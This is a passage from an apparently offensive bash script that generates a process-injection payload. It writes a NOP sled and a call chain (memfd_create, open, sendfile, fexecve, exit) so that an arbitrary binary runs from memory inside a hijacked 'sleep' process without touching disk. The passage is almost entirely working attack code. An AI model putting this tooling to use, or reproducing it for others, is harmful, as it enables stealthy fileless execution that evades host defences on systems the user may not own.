# each syscall will subtract it's length from the SLEDLEN, so we know how many NOPs to write
SLEDLEN=$((${PAYLOADSIZE}/8))
SYSCALLS=()

findstr() {
	local OFFSET=${ALLSTRINGS%%$1*}
	local NEGOFFSET=$((${STRINGSSIZE}-${#OFFSET}))
	echo ${NEGOFFSET}
}

strptr() {
	if [[ $((${STRINGSSIZE}%8)) -eq 0 ]]; then
		echo $(($(($((16#${STACK[1]}))-$(findstr ${1})))))
	else
		echo $(($(($(($((16#${STACK[1]}))-$(findstr ${1})))))-$((8-$((${STRINGSSIZE}%8))))))
	fi
}

STRINGS=()
# argv
STRINGS+=(${@:2})
STRINGS+=("")

ALLSTRINGS=${STRINGS[@]}
STRINGSSIZE=${#ALLSTRINGS}

# string ideas
# store an array of strings that we want. lookup can be performed using ${#${${ARRAY[@]}%%SEARCH*}}
# when writing, write each string followed by a \x00, because ${ARRAY[@]} adds in spaces, the indexes should be the same

# This section is LAST, but generated first so we can access the strings
BINARY=${2}

echo -ne "\r(1/5) FINDING MEMFD_CREATE               " >&2

# memfd_create('ELF...', 0)
# because 400000 is the start of the ELF binary we're running in
# and it makes no difference what the string actually is
syscall 319 $((16#400001)) 0

echo -ne "\r(1/5) MEMFD_CREATE FOUND                 " >&2
echo -ne "\r(2/5) FINDING OPEN                       " >&2

# open(${BINARY}, O_RDONLY, 0)
# where BINARY is the offset from the bottom of the stack to the start of our null terminated string
syscall 2 $(strptr ${2}) 0 0

echo -ne "\r(2/5) OPEN FOUND                         " >&2
echo -ne "\r(3/5) FINDING SENDFILE                   " >&2

filesize ${BINARY}

# `sleep` would never have more than stdin/stdout/stderr open, so we can reliably guess file descriptors
# whilst a little hacky, it means we don't have to try and save retvals from functions
#
# for some reason, the raw sendfile syscall doesn't read all the data, but the glibc one does
# so use the glibc one instead

# sendfile(3, 4, 0, BINARYSIZE)
pltcall "sendfile" 3 4 0 ${FILESIZE}

echo -ne "\r(3/5) SENDFILE FOUND                     " >&2
echo -ne "\r(4/5) FINDING FEXECVE                    " >&2

# the two pointers here should be pointers to each element in argv/envp, followed by a null ptr
# envp currently just uses the null ptr at the end of the argv array, so we don't have to deal with it

# ENVP is easier to work out first
ENVP=$(($(strptr ${2})-8))

# want to be on the first string, not before it, so add 8 again
ARGV=$(($((${ENVP}-$((${#STRINGS[@]}*8))))+8))

pltcall "fexecve" 3 ${ARGV} ${ENVP}

echo -ne "\r(4/5) FEXECVE FOUND                      " >&2
echo -ne "\r(5/5) FINDING EXIT                       " >&2

# exit(0)
syscall 60 0

echo -ne "\r(5/5) EXIT FOUND                         " >&2

if [[ "${PREPARE}" = "PREPARE" ]]; then
	echo "${PRELOAD[@]}"
	exit
fi

# char**s +1 to account for the NULL at the end of the array
SLEDLEN=$((${SLEDLEN}-$((${#STRINGS[@]}+1))))
# char[]s
SLEDLEN=$((${SLEDLEN}-$((${STRINGSSIZE}/8))))

echo >&2
echo "Writing payload..." >&2

rm -f payload.bin
for ((i=${SLEDLEN}; i>0; i--)); do
	write "${NOP}" payload.bin
done

for SYSCALL in ${SYSCALLS[@]}; do
	write "${SYSCALL}" payload.bin
done

# argv array of pointers to char
for ARG in ${@:2}; do
	write $(hexlify $(strptr ${ARG})) payload.bin
done
write $(hexlify 0) payload.bin

for STRING in ${STRINGS[@]}; do
	write ${STRING} payload.bin
	write "\x00" payload.bin
done

echo "Successfully generated payload" >&2
